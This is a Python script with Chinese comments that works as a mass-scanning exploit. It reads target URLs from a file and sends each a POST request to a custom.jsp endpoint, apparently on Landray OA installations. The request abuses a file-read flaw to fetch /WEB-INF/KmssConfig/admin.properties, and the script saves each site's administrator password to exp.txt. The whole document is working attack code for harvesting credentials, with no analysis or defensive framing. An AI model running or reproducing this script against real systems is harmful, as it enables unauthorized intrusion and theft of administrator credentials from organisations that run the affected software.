import requests
import re
from urllib.parse import urlparse, urljoin
import logging

# 配置日志记录器
logging.basicConfig(filename='error.log', level=logging.ERROR)

# 打开包含URL的文件
with open('urls.txt') as file, open('exp.txt', 'w') as outfile:
    # 遍历文件中的所有URL
    for url in file:
        try:
            # 去除换行符
            url = url.strip()

            # 解析URL以获取主机名
            parsed_url = urlparse(url)
            host = parsed_url.netloc

            # 定义请求头
            headers = {
                'Host': host,
                'User-Agent': 'Go-http-client/1.1',
                'Content-Length': '60',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip',
            }

            # 定义POST请求的数据
            data = {
                'var': '{"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
            }

            # 发送POST请求
            response = requests.post(urljoin(url, "/sys/ui/extend/varkind/custom.jsp"), headers=headers, data=data)

            # 提取password的值
            match = re.search(r'password\s*=\s*(\S+)', response.text)
            password = match.group(1) if match else ''

            # 将URL和password的值写入输出文件
            outfile.write(f"{url.strip()}|password={password}\n")

            # 输出响应内容
            print(response.content)

        except Exception as e:
            # 记录错误消息到日志文件
            logging.error(f"Error processing URL {url}: {e}")
            # 跳过当前的URL
            pass
